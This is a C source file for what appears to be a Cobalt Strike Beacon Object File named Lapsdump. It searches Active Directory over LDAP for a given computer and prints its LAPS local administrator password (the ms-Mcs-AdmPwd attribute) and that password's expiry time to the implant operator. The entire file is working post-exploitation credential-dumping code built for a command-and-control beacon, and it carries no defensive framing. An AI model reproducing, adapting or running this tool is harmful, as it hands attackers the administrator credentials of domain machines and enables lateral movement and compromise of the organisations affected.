#include <windows.h>
#include <activeds.h>

#include "Lapsdump.h"
#include "beacon.h"

#define BUF_SIZE 512


HRESULT GetLapsPwd(IDirectorySearch* pContainerToSearch, LPWSTR lpwFilter) {
	HRESULT hr = S_OK;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	BOOL bLapsFound = FALSE;
	LPCWSTR pszAttrFilter[] = { L"ms-Mcs-AdmPwdExpirationTime", L"ms-Mcs-AdmPwd" };
	LPCWSTR wcFormat = L"(&(objectCategory=computer)(objectClass=computer)%s)";
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	ADS_SEARCH_COLUMN col;
	LARGE_INTEGER liValue;
	FILETIME filetime;
	SYSTEMTIME systemtime;
	DATE date;
	VARIANT varDate;

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_SEARCH_SCOPE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = ADS_SCOPE_SUBTREE;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->lpVtbl->SetSearchPreference(pContainerToSearch, &SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, wcFormat, lpwFilter);

	// Return specified properties
	hr = pContainerToSearch->lpVtbl->ExecuteSearch(pContainerToSearch, wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

	if (SUCCEEDED(hr)) {	
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->lpVtbl->GetFirstRow(pContainerToSearch, hSearch);
		if (SUCCEEDED(hr)) {
			while (hr != S_ADS_NOMORE_ROWS) {
				// Keep track of count.
				iCount++;

				// Loop through the array of passed column names, print the data for each column
				while (pContainerToSearch->lpVtbl->GetNextColumnName(pContainerToSearch, hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS) {
					hr = pContainerToSearch->lpVtbl->GetColumn(pContainerToSearch, hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) {
						switch (col.dwADsType) 
						{
							case ADSTYPE_PRINTABLE_STRING:
								for (x = 0; x < col.dwNumValues; x++) {
									bLapsFound = TRUE;
									BeaconPrintf(CALLBACK_OUTPUT, "    LAPS Password:     %ls\n", col.pADsValues[x].CaseExactString);
								}
								break;
							case ADSTYPE_LARGE_INTEGER:
								for (x = 0; x < col.dwNumValues; x++) {
									liValue = col.pADsValues[x].LargeInteger;
									filetime.dwLowDateTime = liValue.LowPart;
									filetime.dwHighDateTime = liValue.HighPart;

									if (KERNEL32$FileTimeToLocalFileTime(&filetime, &filetime) != 0) {
										if (KERNEL32$FileTimeToSystemTime(&filetime, &systemtime) != 0) {
											if (OLEAUT32$SystemTimeToVariantTime(&systemtime, &date) != 0) {
												// Pack in variant.vt
												varDate.vt = VT_DATE;
												varDate.date = date;
												OLEAUT32$VariantChangeType(&varDate, &varDate, VARIANT_NOVALUEPROP, VT_BSTR);
												BeaconPrintf(CALLBACK_OUTPUT, "    Password expires:  %ls\n", varDate.bstrVal);
												OLEAUT32$VariantClear(&varDate);
											}
										}
									}
								}
								break;
							default:
								break;
						}

						pContainerToSearch->lpVtbl->FreeColumn(pContainerToSearch, &col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}		
				// Get the next row
				hr = pContainerToSearch->lpVtbl->GetNextRow(pContainerToSearch, hSearch);
			}
		}
		// Close the search handle to clean up
		pContainerToSearch->lpVtbl->CloseSearchHandle(pContainerToSearch, hSearch);
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}
	
	if (!bLapsFound) {
		hr = S_FALSE;
	}

CleanUp:

	return hr;
}

VOID go(IN PCHAR Args, IN ULONG Length) {
	HRESULT hr = S_OK;
	HINSTANCE hModule = NULL;
	IADs* pObject = NULL;
	IDirectorySearch* pContainerToSearch = NULL;
	IID IADsIID, IDirectorySearchIID;

	LPCWSTR lpwComputername = NULL;

	WCHAR wcPathName[BUF_SIZE] = { 0 };
	WCHAR wcFilter[BUF_SIZE] = { 0 };
	VARIANT varNameCtx;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return;
	}

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);	
	lpwComputername = (WCHAR*)BeaconDataExtract(&parser, NULL);

	// Initialize COM.
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		return;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectorySearchIID = L"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}";

	hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
	hr = OLE32$IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IADsIID,
		(void**)&pObject);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
		goto CleanUp;
	}

	OLEAUT32$VariantInit(&varNameCtx);
	hr = pObject->lpVtbl->Get(pObject, (BSTR)L"defaultNamingContext", &varNameCtx);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.\n");
		goto CleanUp;
	}

	MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
	MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), varNameCtx.bstrVal);

	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IDirectorySearchIID,
		(void**)&pContainerToSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.\n");
		goto CleanUp;
	}

	MSVCRT$wcscpy_s(wcFilter, _countof(wcFilter), L"cn=");
	MSVCRT$wcscat_s(wcFilter, _countof(wcFilter), lpwComputername);

	hr = GetLapsPwd(pContainerToSearch, (LPWSTR)wcFilter);
	if (FAILED(hr) || hr == S_FALSE) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to find LAPS password.\n");
	}

CleanUp:

	OLEAUT32$VariantClear(&varNameCtx);

	if(pObject != NULL){
		pObject->lpVtbl->Release(pObject);
		pObject = NULL;
	}

	if (pContainerToSearch != NULL) {
		pContainerToSearch->lpVtbl->Release(pContainerToSearch);
		pContainerToSearch = NULL;
	}

	OLE32$CoUninitialize();

	return;
}
